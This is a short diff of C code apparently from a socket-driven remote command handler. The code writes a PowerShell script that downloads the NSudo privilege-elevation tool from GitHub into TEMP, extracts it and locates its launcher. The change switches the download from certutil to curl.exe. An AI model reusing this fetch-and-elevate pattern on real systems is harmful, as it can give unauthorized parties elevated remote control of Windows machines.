@@ -207,7 +207,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (f) {
             fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
             fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "certutil -urlcache -split -f 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' $zip\n");
+            fprintf(f, "curl.exe -L -o $zip 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip'\n");
             fprintf(f, "tar -xf $zip -C $out\n");
             fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
             fprintf(f, "if (Test-Path $exe) {\n");
